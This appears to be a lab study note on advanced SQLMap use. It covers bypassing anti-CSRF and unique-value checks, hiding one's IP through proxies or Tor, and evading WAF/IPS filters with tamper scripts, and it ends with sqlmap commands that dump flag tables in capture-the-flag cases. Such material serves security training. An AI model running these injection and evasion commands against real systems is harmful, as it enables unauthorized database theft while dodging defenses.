# 🌚 Advanced SQLMap

## Bypassing Web Application Protections

### Anti-CSRF Token Bypass

The option to do this is `--csrf-token`. By specifying the token parameter name (which should already be available within the provided request data), SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.

```shell-session
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

### Unique Value Bypass

In some cases, the web application may only require unique values to be provided inside predefined parameters.

For this, the option `--randomize` should be used, pointing to the parameter name containing a value which should be randomized before being sent

```shell-session
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

### IP Address Concealing

In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option `--proxy`

`--proxy="socks4://177.39.187.70:33283"`, where we should add a working proxy.

### Tamper Scripts

This is used for bypassing WAF/IPS solutions. It works by replacing all occurrences of greater than operator (`>`) with `NOT BETWEEN 0 AND #`, and the equals operator (`=`) with `BETWEEN # AND #`. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed,

It works with `--tamper` option (e.g. `--tamper=between,randomcase`)

_**What's the contents of table flag8? (Case #8)**_

```
sqlmap "http://94.237.62.203:52197/case8.php" --data="id=1&t0ken=SuQhbWwUwbl9sxBQlHFPJLmBfBifEvKZgGfeCpq8i8" --csrf-token="t0ken" --batch --dump
```

_**What's the contents of table flag9? (Case #9)**_

```
sqlmap -u "http://94.237.62.203:52197/case9.php?id=1&uid=760203960" --randomize=uid --batch -v 5 --dump
```

_**What's the contents of table flag10? (Case #10)**_

```
sqlmap -r case10.txt -T flag10 --dump
```

_**What's the contents of table flag11? (Case #11)**_

```
sqlmap -r case11.txt -T flag11 --dump --tamper=between
```
